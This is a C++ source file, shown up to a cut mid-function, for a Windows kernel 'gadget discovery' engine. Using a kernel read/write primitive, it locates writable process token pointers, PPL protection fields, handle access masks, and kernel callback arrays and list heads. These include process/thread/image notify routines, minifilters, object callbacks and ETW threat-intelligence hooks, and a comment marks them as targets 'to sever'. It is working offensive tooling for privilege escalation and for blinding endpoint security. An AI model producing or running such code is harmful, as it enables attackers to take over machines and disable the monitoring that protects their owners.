#include "GadgetDiscovery.h"
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <algorithm>
#include <sstream>
#include <psapi.h>
#include "ntshim.h"
#include "SymbolResolver.hpp"
#include <dbghelp.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "dbghelp.lib")

// KernelObjectEnumerator implementation
KernelObjectEnumerator::KernelObjectEnumerator(KernelReadWrite* readWrite, const OffsetDatabase& offsetDb)
    : rw(readWrite), offsets(offsetDb) {}

std::vector<uint64_t> KernelObjectEnumerator::EnumerateProcesses() {
    std::vector<uint64_t> processes;
    
    // Use SystemHandleInformation (dynamic buffer to catch new processes)
    ULONG size = 0x20000;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    std::unique_ptr<uint8_t[]> buffer;
    for (int attempts = 0; attempts < 5 && status == STATUS_INFO_LENGTH_MISMATCH; ++attempts) {
        size *= 2;
        buffer.reset(new uint8_t[size]);
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)0x10, // SystemHandleInformation
            buffer.get(),
            size,
            NULL
        );
    }
    
    if (status >= 0) {
        auto info = (PSYSTEM_HANDLE_INFORMATION)buffer.get();
        for (ULONG i = 0; i < info->HandleCount; i++) {
            // ObjectTypeIndex 7 is often Process; include anything that looks like a process object
            if (info->Handles[i].ObjectTypeIndex == 7) {
                uint64_t object = (uint64_t)info->Handles[i].Object;
                if (rw->IsValidAddress(object)) {
                    processes.push_back(object);
                }
            }
        }
    }
    
    // Always also walk ActiveProcessLinks to catch any missed entries (no longer fallback-only)
    if (offsets.eprocess_active_process_links != 0) {
        uint64_t nt_base = 0;
        LPVOID drivers[1024] = {};
        DWORD needed = 0;
        if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed) && needed >= sizeof(LPVOID)) {
            nt_base = reinterpret_cast<uint64_t>(drivers[0]);
        }
        auto rva_psinit = symres::ResolveNtoskrnlSymbolRva("PsInitialSystemProcess");
        if (nt_base && rva_psinit) {
            uint64_t psinit_va = nt_base + *rva_psinit;
            uint64_t head = rw->ReadPointer(psinit_va);
            uint64_t list_head = head + offsets.eprocess_active_process_links;
            uint64_t flink = rw->ReadPointer(list_head);
            const int maxWalk = 0x10000;
            int walked = 0;
            while (flink && flink != list_head && walked++ < maxWalk) {
                uint64_t eproc = flink - offsets.eprocess_active_process_links;
                if (rw->IsValidAddress(eproc)) processes.push_back(eproc);
                flink = rw->ReadPointer(flink);
            }
        }
    }
    
    // Remove duplicates
    std::sort(processes.begin(), processes.end());
    processes.erase(std::unique(processes.begin(), processes.end()), processes.end());
    
    return processes;
}

std::vector<uint64_t> KernelObjectEnumerator::EnumerateThreads() {
    std::vector<uint64_t> threads;
    
    ULONG size = 0x100000;
    std::unique_ptr<uint8_t[]> buffer(new uint8_t[size]);
    
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)0x10,
        buffer.get(),
        size,
        NULL
    );
    
    if (status >= 0) {
        auto info = (PSYSTEM_HANDLE_INFORMATION)buffer.get();
        for (ULONG i = 0; i < info->HandleCount; i++) {
            // ObjectTypeIndex 8 is Thread
            if (info->Handles[i].ObjectTypeIndex == 8) {
                uint64_t object = (uint64_t)info->Handles[i].Object;
                if (rw->IsValidAddress(object)) {
                    threads.push_back(object);
                }
            }
        }
    }
    
    return threads;
}

std::vector<uint64_t> KernelObjectEnumerator::EnumerateObjectTypes() {
    std::vector<uint64_t> objectTypes;

    // Try ObTypeIndexTable exported in public PDBs
    auto rva = symres::ResolveNtoskrnlSymbolRva("ObTypeIndexTable");
    if (!rva) return objectTypes;

    LPVOID drivers[1024] = {};
    DWORD needed = 0;
    uint64_t nt_base = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed) && needed >= sizeof(LPVOID)) {
        nt_base = reinterpret_cast<uint64_t>(drivers[0]);
    }
    if (!nt_base) return objectTypes;

    uint64_t table_va = nt_base + *rva;
    // Conservative limit: 0x100 possible types
    for (int i = 0; i < 0x100; i++) {
        uint64_t type_ptr = rw->ReadPointer(table_va + i * sizeof(uint64_t));
        if (type_ptr && rw->IsValidAddress(type_ptr)) {
            objectTypes.push_back(type_ptr);
        }
    }

    return objectTypes;
}

std::vector<uint64_t> KernelObjectEnumerator::EnumerateHandles(uint64_t process) {
    std::vector<uint64_t> handles;
    
    uint64_t handleTable = rw->ReadPointer(process + offsets.eprocess_object_table);
    if (handleTable && rw->IsValidAddress(handleTable)) {
        // Simplified handle table walking
        // Full implementation would parse the handle table structure
    }
    
    return handles;
}

uint32_t KernelObjectEnumerator::GetProcessId(uint64_t process) {
    return rw->ReadUint32(process + offsets.eprocess_unique_process_id);
}

std::string KernelObjectEnumerator::GetProcessName(uint64_t process) {
    uint64_t nameAddr = process + offsets.eprocess_image_filename;
    return rw->ReadString(nameAddr, 15);
}

uint64_t KernelObjectEnumerator::GetProcessToken(uint64_t process) {
    return rw->ReadPointer(process + offsets.eprocess_token);
}

uint64_t KernelObjectEnumerator::GetThreadProcess(uint64_t thread) {
    return rw->ReadPointer(thread + offsets.ethread_threads_process);
}

uint32_t KernelObjectEnumerator::GetThreadId(uint64_t thread) {
    uint64_t cidAddr = thread + offsets.ethread_cid;
    return rw->ReadUint32(cidAddr + 0x04); // CLIENT_ID->UniqueThread
}

bool KernelObjectEnumerator::IsProtectedProcess(uint64_t process) {
    uint32_t flags = rw->ReadUint32(process + offsets.eprocess_flags);
    return (flags & 0x80) != 0; // PS_PROTECTED flag
}

bool KernelObjectEnumerator::IsPPLProcess(uint64_t process) {
    uint32_t flags = rw->ReadUint32(process + offsets.eprocess_flags);
    return (flags & 0x100) != 0; // PS_PROTECTED_LIGHT flag
}

// GadgetDiscoveryEngine implementation
GadgetDiscoveryEngine::GadgetDiscoveryEngine(KernelReadWrite* readWrite)
    : rw(readWrite) {
    
    offsets = offsetManager.GetCurrentOffsets();
    enumerator = std::make_unique<KernelObjectEnumerator>(rw, offsets);
    InitializePatterns();
}

void GadgetDiscoveryEngine::InitializePatterns() {
    patterns = {
        // Token fields
        {GadgetType::TOKEN_FIELD, "TOKEN_FIELD", "_EPROCESS", "Token",
         {"SeAccessCheck", "PsReferencePrimaryToken", "SeTokenIsAdmin"}, 100, 8, 8, ValidateTokenField},
        
        // Handle access masks
        {GadgetType::HANDLE_TABLE_ENTRY_ACCESS, "HANDLE_ACCESS", "_HANDLE_TABLE_ENTRY", "GrantedAccess",
         {"ObReferenceObjectByHandle", "ObpIncrementHandleCount"}, 95, 4, 4, ValidateAccessMask},
        
        // Process creation callbacks
        {GadgetType::PROCESS_CALLBACK, "PROCESS_CALLBACK", "PspCreateProcessNotifyRoutine", "",
         {"PspCallProcessNotifyRoutines"}, 90, 8, 8, ValidateCallback},
        
        // Thread creation callbacks
        {GadgetType::THREAD_CALLBACK, "THREAD_CALLBACK", "PspCreateThreadNotifyRoutine", "",
         {"PspCallThreadNotifyRoutines"}, 90, 8, 8, ValidateCallback},
        
        // Image load callbacks
        {GadgetType::IMAGE_CALLBACK, "IMAGE_CALLBACK", "PspLoadImageNotifyRoutine", "",
         {"PspCallImageNotifyRoutines"}, 90, 8, 8, ValidateCallback},
        
        // Object type function pointers
        {GadgetType::OBJECT_TYPE_OPEN, "OBJ_OPEN", "_OBJECT_TYPE", "OpenProcedure",
         {"ObpOpenObject"}, 85, 8, 8, ValidateFunctionPointer},
        
        {GadgetType::OBJECT_TYPE_CLOSE, "OBJ_CLOSE", "_OBJECT_TYPE", "CloseProcedure",
         {"ObpCloseObject"}, 85, 8, 8, ValidateFunctionPointer},
        
        {GadgetType::OBJECT_TYPE_DELETE, "OBJ_DELETE", "_OBJECT_TYPE", "DeleteProcedure",
         {"ObpDeleteObject"}, 85, 8, 8, ValidateFunctionPointer},
        
        {GadgetType::OBJECT_TYPE_SECURITY, "OBJ_SECURITY", "_OBJECT_TYPE", "SecurityProcedure",
         {"SeDefaultObjectMethod"}, 85, 8, 8, ValidateFunctionPointer},
        
        // Token privileges
        {GadgetType::TOKEN_PRIVILEGES, "TOKEN_PRIV", "_TOKEN", "Privileges",
         {"SePrivilegeCheck", "SeSinglePrivilegeCheck"}, 95, 8, 8, ValidatePrivileges},
        
        // Process flags
        {GadgetType::PROCESS_FLAGS, "PROC_FLAGS", "_EPROCESS", "Flags",
         {"PsIsProcessBeingDebugged", "PspGetProcessFlags"}, 70, 4, 4, ValidateFlags},
        
        // Timer DPC
        {GadgetType::TIMER_DPC, "TIMER_DPC", "_KTIMER", "Dpc",
         {"KiProcessExpiredTimer"}, 75, 8, 8, ValidateFunctionPointer},
        
        // DPC routine
        {GadgetType::DPC_ROUTINE, "DPC_ROUTINE", "_KDPC", "DeferredRoutine",
         {"KiExecuteDpc"}, 80, 8, 8, ValidateFunctionPointer},
        
        // APC routines
        {GadgetType::APC_KERNEL_ROUTINE, "APC_KERNEL", "_KAPC", "KernelRoutine",
         {"KiInitializeApc", "KiInsertQueueApc"}, 80, 8, 8, ValidateFunctionPointer},
        
        {GadgetType::APC_NORMAL_ROUTINE, "APC_NORMAL", "_KAPC", "NormalRoutine",
         {"KiDeliverApc"}, 80, 8, 8, ValidateFunctionPointer},
        
        // Work item routines
        {GadgetType::WORK_ITEM_ROUTINE, "WORK_ITEM", "_IO_WORKITEM", "Routine",
         {"IopProcessWorkItem"}, 80, 8, 8, ValidateFunctionPointer},
        
        // Driver major functions
        {GadgetType::DRIVER_MAJOR_FUNCTION, "DRIVER_MAJOR", "_DRIVER_OBJECT", "MajorFunction",
         {"IofCallDriver"}, 85, 8, 8, ValidateFunctionPointer},
        
        // Driver unload
        {GadgetType::DRIVER_UNLOAD, "DRIVER_UNLOAD", "_DRIVER_OBJECT", "DriverUnload",
         {"IopDeleteDriver"}, 80, 8, 8, ValidateFunctionPointer},
        
        // Generic function pointer
        {GadgetType::GENERIC_FUNCTION_POINTER, "FUNC_PTR", "", ".*(Routine|Callback|Procedure|Handler)$",
         {}, 50, 8, 8, nullptr},
        
        // Generic access mask
        {GadgetType::GENERIC_ACCESS_MASK, "ACCESS_MASK", "", ".*(Access|Rights|Mask)$",
         {}, 45, 4, 4, ValidateAccessMask},
        
        // Generic flag field
        {GadgetType::GENERIC_FLAG_FIELD, "FLAG", "", ".*(Flag|Flags|Attributes)$",
         {}, 40, 4, 4, nullptr}
    };
}

std::vector<DataGadget> GadgetDiscoveryEngine::DiscoverAllGadgets() {
  //  std::cout << "[*] Starting comprehensive data-only gadget discovery..." << std::endl;
    std::cout << "[*] Target Windows build: " << versionDetector.GetBuildNumber() << std::endl;
    std::cout << "[*] Using offsets for: " << versionDetector.GetVersionName() << std::endl;
    std::cout << std::endl;
    
    discovered_gadgets.clear();
    
    // Run all discovery stages
    DiscoverFromProcesses();
    DiscoverFromCallbackArrays();
    DiscoverFromObjectTypes();
    DiscoverFromHandleTables();
    DiscoverFromSymbolPatterns();
    if (enable_pattern_scan) {
        DiscoverFromMemoryScan();
    } else {
        std::cout << "[*] Stage 6: Skipped (pattern scan disabled)\n";
    }
    if (enable_crossrefs) {
        DiscoverFromCrossReferences();
    } else {
        std::cout << "[*] Stage 7: Skipped (cross-references disabled)\n";
    }
    if (enable_validation) {
        ValidateGadgetsDynamically();
    } else {
        std::cout << "[*] Stage 8: Skipped (dynamic validation disabled)\n";
    }
    
    // Score all gadgets
    ScoreGadgets();
    
    std::cout << std::endl;
    std::cout << "[+] Discovery complete. Found " << discovered_gadgets.size() 
              << " potential data-only gadgets." << std::endl;
    
    return GetGadgetList();
}

void GadgetDiscoveryEngine::DiscoverFromProcesses() {
    std::cout << "[*] Stage 1: Scanning processes..." << std::endl;
    
    auto processes = enumerator->EnumerateProcesses();
    int tokenCount = 0;
    int flagCount = 0;
    
    for (auto& proc : processes) {
        uint32_t pid = enumerator->GetProcessId(proc);
        std::string name = enumerator->GetProcessName(proc);
        
        // Check token field
        uint64_t tokenAddr = proc + offsets.eprocess_token;
        uint64_t tokenValue = rw->ReadPointer(tokenAddr) & ~0xFULL; // strip _EX_FAST_REF low bits
        
        if (tokenValue && rw->IsValidAddress(tokenValue)) {
            DataGadget gadget;
            gadget.type = GadgetType::TOKEN_FIELD;
            gadget.type_name = "TOKEN_FIELD";
            gadget.name = "Token_" + name + "_" + std::to_string(pid);
            gadget.address = tokenAddr;
            gadget.structure_base = proc;
            gadget.structure_name = "_EPROCESS";
            gadget.field_name = "Token";
            gadget.field_offset = tokenAddr - proc;
            gadget.size = 8;
            gadget.original_value = tokenValue;
            gadget.process_id = pid;
            gadget.owner_process = name;
            gadget.is_writable = true;
            gadget.is_readable = true;
            gadget.confidence_score = 85;
            
            discovered_gadgets[tokenAddr] = gadget;
            tokenCount++;
        }
        
        // Check flags field
        uint64_t flagsAddr = proc + offsets.eprocess_flags;
        uint32_t flags = rw->ReadUint32(flagsAddr);
        
        DataGadget flagGadget;
        flagGadget.type = GadgetType::PROCESS_FLAGS;
        flagGadget.type_name = "PROCESS_FLAGS";
        flagGadget.name = "Flags_" + name + "_" + std::to_string(pid);
        flagGadget.address = flagsAddr;
        flagGadget.structure_base = proc;
        flagGadget.structure_name = "_EPROCESS";
        flagGadget.field_name = "Flags";
        flagGadget.field_offset = flagsAddr - proc;
        flagGadget.size = 4;
        flagGadget.original_value = flags;
        flagGadget.process_id = pid;
        flagGadget.owner_process = name;
        flagGadget.is_writable = CheckWritable(flagsAddr);
        flagGadget.confidence_score = 70;
        
        discovered_gadgets[flagsAddr] = flagGadget;
        flagCount++;

        // Protection field (used for PPL/PS)
        if (offsets.eprocess_protection) {
            uint64_t protAddr = proc + offsets.eprocess_protection;
            uint8_t prot = rw->ReadUint8(protAddr);

            DataGadget protGadget;
            protGadget.type = GadgetType::PROCESS_FLAGS; // reuse type bucket for now
            protGadget.type_name = "PROCESS_PROTECTION";
            protGadget.name = "Prot_" + name + "_" + std::to_string(pid);
            protGadget.address = protAddr;
            protGadget.structure_base = proc;
            protGadget.structure_name = "_EPROCESS";
            protGadget.field_name = "Protection";
            protGadget.field_offset = protAddr - proc;
            protGadget.size = 1;
            protGadget.original_value = prot;
            protGadget.process_id = pid;
            protGadget.owner_process = name;
            protGadget.is_writable = CheckWritable(protAddr);
            protGadget.is_readable = true;
            protGadget.confidence_score = 80;

            discovered_gadgets[protAddr] = protGadget;
        }
    }
    
    std::cout << "[+] Found " << tokenCount << " token fields from " 
              << processes.size() << " processes" << std::endl;
}

void GadgetDiscoveryEngine::DiscoverFromCallbackArrays() {
    std::cout << "[*] Stage 2: Scanning callback arrays..." << std::endl;
    
    // List of known callback arrays (fixed-size arrays of pointers)
    std::vector<std::pair<std::string, GadgetType>> callbackNames = {
        {"PspCreateProcessNotifyRoutine", GadgetType::PROCESS_CALLBACK},
        {"PspCreateProcessNotifyRoutineEx", GadgetType::PROCESS_CALLBACK},
        {"PspCreateThreadNotifyRoutine", GadgetType::THREAD_CALLBACK},
        {"PspCreateThreadNotifyRoutineEx", GadgetType::THREAD_CALLBACK},
        {"PspLoadImageNotifyRoutine", GadgetType::IMAGE_CALLBACK},
        {"PspLoadImageNotifyRoutineEx", GadgetType::IMAGE_CALLBACK},
        {"ObRegisterCallbacks", GadgetType::OBJECT_CALLBACK},
        {"KeRegisterBugCheckCallback", GadgetType::BUGCHECK_CALLBACK},
        {"IoRegisterShutdownNotification", GadgetType::SHUTDOWN_CALLBACK},
        {"FltRegisterFilter", GadgetType::MINIFILTER_CALLBACK},
        {"EtwTiLogReadWriteVm", GadgetType::ETW_CALLBACK}
    };
    
    int callbackCount = 0;
    
    for (auto& [name, type] : callbackNames) {
        uint64_t arrayAddr = FindSymbolAddress(name);
        
        if (arrayAddr) {
            // Each callback array can have up to 64 entries
            for (int i = 0; i < 64; i++) {
                uint64_t entryAddr = arrayAddr + (i * 8);
                uint64_t callback = rw->ReadPointer(entryAddr);
                
                if (callback && callback > 0xFFFF000000000000) {
                    DataGadget gadget;
                    gadget.type = type;
                    gadget.type_name = name;
                    gadget.name = name + "_Entry_" + std::to_string(i);
                    gadget.address = entryAddr;
                    gadget.structure_base = arrayAddr;
                    gadget.structure_name = name;
                    gadget.field_name = "Entry" + std::to_string(i);
                    gadget.field_offset = i * 8;
                    gadget.size = 8;
                    gadget.original_value = callback;
                    gadget.is_writable = CheckWritable(entryAddr);
                    gadget.confidence_score = 95;
                    
                    // Find what calls this
                    auto references = FindCrossReferences(entryAddr);
                    if (!references.empty()) {
                        gadget.trigger_address = references[0];
                        gadget.is_triggerable = true;
                    }
                    
                    discovered_gadgets[entryAddr] = gadget;
                    callbackCount++;
                }
            }
        }
    }

    // Linked-list based callback registries (treat list head as writable target to sever list)
    std::vector<std::pair<std::string, GadgetType>> listHeads = {
        {"ObpRegisterCallbackListHead", GadgetType::OBJECT_CALLBACK},
        {"ObpRegisteredCallbacks", GadgetType::OBJECT_CALLBACK},
        {"FltpFilterListHead", GadgetType::MINIFILTER_CALLBACK},
        {"FltpMiniFilterList", GadgetType::MINIFILTER_CALLBACK},
        {"EtwTiLogReadWriteVm", GadgetType::ETW_CALLBACK},
        {"EtwpLogReadWriteVm", GadgetType::ETW_CALLBACK}
    };

    for (auto& [name, type] : listHeads) {
        uint64_t headAddr = FindSymbolAddress(name);
        if (!headAddr) continue;

        DataGadget gadget;
        gadget.type = type;
        gadget.type_name = name;
        gadget.name = name + "_Head";
        gadget.address = headAddr;
        gadget.structure_base = headAddr;
        gadget.structure_name = name;
        gadget.field_name = "Head";
        gadget.field_offset = 0;
        gadget.size = 8;
        gadget.original_value = rw->ReadPointer(headAddr);
        gadget.is_writable = CheckWritable(headAddr);
        gadget.confidence_score = 85;

        discovered_gadgets[headAddr] = gadget;
        callbackCount++;
    }
    
    std::cout << "[+] Found " << callbackCount << " callback entries" << std::endl;
}

void GadgetDiscoveryEngine::DiscoverFromObjectTypes() {
    std::cout << "[*] Stage 3: Scanning object types..." << std::endl;
    
    auto objectTypes = enumerator->EnumerateObjectTypes();
    int fptrCount = 0;
    
    for (auto& objType : objectTypes) {
        // Get type info structure
        uint64_t typeInfoAddr = objType + offsets.object_type_type_info;
        
        // Function pointers in TypeInfo
        struct FPtrInfo {
            GadgetType type;
            std::string name;
            uint32_t offset;
        };
        
        std::vector<FPtrInfo> fptrs = {
            {GadgetType::OBJECT_TYPE_OPEN, "OpenProcedure", offsets.type_info_open_procedure},
            {GadgetType::OBJECT_TYPE_CLOSE, "CloseProcedure", offsets.type_info_close_procedure},
            {GadgetType::OBJECT_TYPE_DELETE, "DeleteProcedure", offsets.type_info_delete_procedure},
            {GadgetType::OBJECT_TYPE_PARSE, "ParseProcedure", offsets.type_info_parse_procedure},
            {GadgetType::OBJECT_TYPE_SECURITY, "SecurityProcedure", offsets.type_info_security_procedure},
            {GadgetType::OBJECT_TYPE_QUERYNAME, "QueryNameProcedure", offsets.type_info_query_name_procedure}
        };
        
        for (auto& fptr : fptrs) {
            uint64_t fptrAddr = typeInfoAddr + fptr.offset;
            uint64_t fptrValue = rw->ReadPointer(fptrAddr);
            
            if (fptrValue && IsKernelCodeAddress(fptrValue)) {
                DataGadget gadget;
                gadget.type = fptr.type;
                gadget.type_name = fptr.name;
                gadget.name = "ObjectType_" + fptr.name;
                gadget.address = fptrAddr;
                gadget.structure_base = objType;
                gadget.structure_name = "_OBJECT_TYPE";
                gadget.field_name = fptr.name;
                gadget.field_offset = (fptrAddr - objType);
                gadget.size = 8;
                gadget.original_value = fptrValue;
                gadget.is_writable = CheckWritable(fptrAddr);
                gadget.confidence_score = 85;
                
                discovered_gadgets[fptrAddr] = gadget;
                fptrCount++;
            }
        }
    }
    
    std::cout << "[+] Found " << fptrCount << " object type function pointers" << std::endl;
}

void GadgetDiscoveryEngine::DiscoverFromHandleTables() {
    std::cout << "[*] Stage 4: Scanning handle tables..." << std::endl;
    int handleCount = 0;

    // Reuse SystemHandleInformation that Stage 1 already leverages
    ULONG size = 0x100000;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    std::unique_ptr<uint8_t[]> buffer;
    for (int tries = 0; tries < 5 && status == STATUS_INFO_LENGTH_MISMATCH; ++tries) {
        buffer.reset(new uint8_t[size]);
        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x10, buffer.get(), size, NULL);
        if (status == STATUS_INFO_LENGTH_MISMATCH) size *= 2;
    }
    if (status >= 0) {
        auto info = (PSYSTEM_HANDLE_INFORMATION)buffer.get();
        for (ULONG i = 0; i < info->HandleCount; i++) {
            uint64_t entry = (uint64_t)info->Handles[i].Object;
            if (!rw->IsValidAddress(entry)) continue;

            uint64_t accessAddr = entry + offsets.handle_entry_granted_access;
            uint32_t access = rw->ReadUint32(accessAddr);
            DataGadget ga{};
            ga.type = GadgetType::HANDLE_TABLE_ENTRY_ACCESS;
            ga.type_name = "HANDLE_ACCESS";
            ga.name = "HandleAccess_" + std::to_string(i);
            ga.address = accessAddr;
            ga.structure_base = entry;
            ga.structure_name = "_HANDLE_TABLE_ENTRY";
            ga.field_name = "GrantedAccess";
            ga.field_offset = offsets.handle_entry_granted_access;
            ga.size = 4;
            ga.original_value = access;
            ga.is_writable = true;
            ga.confidence_score = 70;
            discovered_gadgets[ga.address] = ga;

            uint64_t attrAddr = entry + offsets.handle_entry_attributes;
            uint32_t attrs = rw->ReadUint32(attrAddr);
            DataGadget gb{};
            gb.type = GadgetType::HANDLE_TABLE_ENTRY_ATTRIBUTES;
            gb.type_name = "HANDLE_ATTR";
            gb.name = "HandleAttr_" + std::to_string(i);
            gb.address = attrAddr;
            gb.structure_base = entry;
            gb.structure_name = "_HANDLE_TABLE_ENTRY";
            gb.field_name = "Attributes";
            gb.field_offset = offsets.handle_entry_attributes;
            gb.size = 4;
            gb.original_value = attrs;
            gb.is_writable = true;
            gb.confidence_score = 70;
            discovered_gadgets[gb.address] = gb;

            handleCount += 2;
        }
    }

    std::cout << "[+] Found " << handleCount << " handle access entries" << std::endl;
}

void GadgetDiscoveryEngine::DiscoverFromSymbolPatterns() {
    std::cout << "[*] Stage 5: Scanning symbol patterns..." << std::endl;

    // Resolve running ntoskrnl path/base
    LPVOID drivers[1024] = {};
    DWORD needed = 0;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed) || needed < sizeof(LPVOID)) {
        std::cout << "[-] EnumDeviceDrivers failed, skipping symbol scan" << std::endl;
        return;
    }

    char ntPath[MAX_PATH] = {0};
    if (!GetDeviceDriverFileNameA(drivers[0], ntPath, MAX_PATH)) {
        std::cout << "[-] GetDeviceDriverFileNameA failed, skipping symbol scan" << std::endl;
        return;
    }
    std::string ntPathStr(ntPath);
    // Normalize \SystemRoot\ -> %SystemRoot%
    const std::string sysRootPrefix = "\\SystemRoot\\";
    if (ntPathStr.rfind(sysRootPrefix, 0) == 0) {
        char winDir[MAX_PATH] = {0};
        if (GetWindowsDirectoryA(winDir, MAX_PATH)) {
            ntPathStr = std::string(winDir) + ntPathStr.substr(sysRootPrefix.size() - 1); // keep leading backslash
        }
    }

    DWORD64 modBase = reinterpret_cast<DWORD64>(drivers[0]);
    HANDLE proc = GetCurrentProcess();

    // Symbol path: env override or default to local cache + MSFT
    char symEnv[2048] = {0};
    DWORD symLen = GetEnvironmentVariableA("DOG_SYMPATH", symEnv, sizeof(symEnv));
    const char* symPath = (symLen > 0 && symLen < sizeof(symEnv)) ? symEnv : "srv*C:\\symbols*https://msdl.microsoft.com/download/symbols";
    std::cout << "    using symbol path: " << symPath << std::endl;

    SymSetOptions(SYMOPT_DEFERRED_LOADS | SYMOPT_UNDNAME);
    SymSetSearchPath(proc, symPath);
    if (!SymInitialize(proc, symPath, FALSE)) {
        std::cout << "[-] SymInitialize failed (" << GetLastError() << "), skipping symbol scan" << std::endl;
        return;
    }

    // Let dbghelp pick a base if needed; also allow existing loaded base
    SymRefreshModuleList(proc);
    DWORD64 loadedBase = SymLoadModuleEx(proc, nullptr, ntPathStr.c_str(), nullptr, 0, 0, nullptr, 0);
    if (!loadedBase) {
        // Fallback: load from base only (no file)
        loadedBase = SymLoadModuleEx(proc, nullptr, nullptr, nullptr, modBase, 0, nullptr, 0);
    }
    if (!loadedBase) {
        std::cout << "[-] SymLoadModule64 failed (" << GetLastError() << "), skipping symbol scan" << std::endl;
        SymCleanup(proc);
        return;
    }

    std::vector<std::pair<std::string, GadgetType>> symbols = {
        {"PspCreateProcessNotifyRoutine", GadgetType::PROCESS_CALLBACK},
        {"PspCreateProcessNotifyRoutineEx", GadgetType::PROCESS_CALLBACK},
        {"PspCreateThreadNotifyRoutine", GadgetType::THREAD_CALLBACK},
        {"PspCreateThreadNotifyRoutineEx", GadgetType::THREAD_CALLBACK},
        {"PspLoadImageNotifyRoutine", GadgetType::IMAGE_CALLBACK},
        {"PspLoadImageNotifyRoutineEx", GadgetType::IMAGE_CALLBACK},
        {"KeBugCheckCallbackListHead", GadgetType::BUGCHECK_CALLBACK},
        {"ObTypeIndexTable", GadgetType::OBJECT_TYPE_OPEN}, // marker for object type table
        {"ObpRegisterCallbackListHead", GadgetType::OBJECT_CALLBACK},
        {"ObpRegisteredCallbacks", GadgetType::OBJECT_CALLBACK},
        {"FltpFilterListHead", GadgetType::MINIFILTER_CALLBACK},
        {"FltpMiniFilterList", GadgetType::MINIFILTER_CALLBACK},
        {"EtwTiLogReadWriteVm", GadgetType::ETW_CALLBACK},
        {"EtwpLogReadWriteVm", GadgetType::ETW_CALLBACK},
    };

    struct ExtraSym {
        std::string name;
        std::string label;
        bool is_flag;
    };
    std::vector<ExtraSym> extra = {
        {"PspNotifyEnableMask", "PspNotifyEnableMask", true},
        {"PspCallProcessNotifyRoutines", "PspCallProcessNotifyRoutines", false},
        {"ObpRegisterCallbackListHead", "ObpRegisterCallbackListHead", false},
        {"KeBugCheckReasonCallbackListHead", "KeBugCheckReasonCallbackListHead", false},
        {"KiNmiCallbackListHead", "KiNmiCallbackListHead", false},
        {"KeNmiCallbackListHead", "KeNmiCallbackListHead", false},
    };

    int added = 0;
    int failed = 0;
    SYMBOL_INFO_PACKAGE sip{};
    sip.si.SizeOfStruct = sizeof(SYMBOL_INFO);
    sip.si.MaxNameLen = sizeof(sip.name);

    auto tryResolve = [&](const std::string& sym) -> bool {
        if (SymFromName(proc, sym.c_str(), &sip.si)) return true;
        std::string prefixed = "nt!" + sym;
        if (SymFromName(proc, prefixed.c_str(), &sip.si)) return true;
        std::string prefixed2 = "ntoskrnl.exe!" + sym;
        return SymFromName(proc, prefixed2.c_str(), &sip.si);
    };

    // Skip adding symbol-based gadgets entirely (avoid symbol-derived targets)
    for (auto& [name, type] : symbols) {
        if (!tryResolve(name)) { failed++; continue; }
    }

    // Extra symbols (read-only reference gadgets)
    for (auto& es : extra) {
        if (!tryResolve(es.name)) continue;
    }

    SymUnloadModule64(proc, loadedBase);
    SymCleanup(proc);

    std::cout << "[+] Resolved " << added << " gadgets via symbols";
    if (failed) std::cout << " (" << failed << " lookups failed)";
    std::cout << std::endl;
}

void GadgetDiscoveryEngine::DiscoverFromMemoryScan() {
    std::cout << "[*] Stage 6: Scanning kernel memory for patterns..." << std::endl;

    struct Range { uint64_t start; uint64_t size; };
    std::vector<Range> ranges;

    // Build ranges from loaded drivers' PE sections
    LPVOID drivers[1024] = {};
    DWORD needed = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed) && needed >= sizeof(LPVOID)) {
        size_t count = needed / sizeof(LPVOID);
        for (size_t i = 0; i < count && i < 1024; ++i) {
            uint64_t base = reinterpret_cast<uint64_t>(drivers[i]);
            // Read DOS + NT headers
            IMAGE_DOS_HEADER dos{};
            if (!rw->ReadMemory(base, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE)
                continue;
            IMAGE_NT_HEADERS64 nth{};
            if (!rw->ReadMemory(base + dos.e_lfanew, &nth, sizeof(nth)) || nth.Signature != IMAGE_NT_SIGNATURE)
                continue;
            // Read section headers
            size_t secCount = nth.FileHeader.NumberOfSections;
            if (secCount == 0 || secCount > 64) continue;
            std::vector<IMAGE_SECTION_HEADER> secs(secCount);
            size_t secBytes = secCount * sizeof(IMAGE_SECTION_HEADER);
            if (!rw->ReadMemory(base + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64), secs.data(), secBytes))
                continue;
            for (auto& s : secs) {
                uint32_t chars = s.Characteristics;
                bool executable = chars & IMAGE_SCN_MEM_EXECUTE;
                bool readable   = chars & IMAGE_SCN_MEM_READ;
                bool writable   = chars & IMAGE_SCN_MEM_WRITE;
                if (!(executable || readable || writable)) continue;
                uint64_t start = base + s.VirtualAddress;
                uint64_t size = std::max<uint32_t>(s.Misc.VirtualSize, s.SizeOfRawData);
                if (size == 0) continue;
                ranges.push_back({start, size});
            }
        }
    }

    if (ranges.empty()) {
        std::cout << "[-] No kernel section ranges built; skipping pattern scan\n";
        return;
    }

    int patternCount = 0;
    uint64_t scannedBytes = 0;
    const uint64_t logInterval = 16 * 1024 * 1024; // log every 16 MB
    uint64_t nextLog = logInterval;

    for (auto& r : ranges) {
        uint64_t end = r.start + r.size;
        for (uint64_t addr = r.start; addr < end; addr += 8) {
            scannedBytes += 8;
            if (!rw->IsValidAddress(addr)) continue;

            uint64_t value = rw->ReadPointer(addr);

            if (IsKernelCodeAddress(value)) {
                bool isTable = true;
                for (int i = 1; i <= 3; i++) {
                    uint64_t next = rw->ReadPointer(addr + (i * 8));
                    if (!IsKernelCodeAddress(next)) {
                        isTable = false;
                        break;
                    }
                }

                if (isTable) {
                    DataGadget gadget;
                    gadget.type = GadgetType::GENERIC_FUNCTION_POINTER;
                    gadget.type_name = "FUNC_TABLE";
                    gadget.name = "FuncTable_0x" + std::to_string(addr);
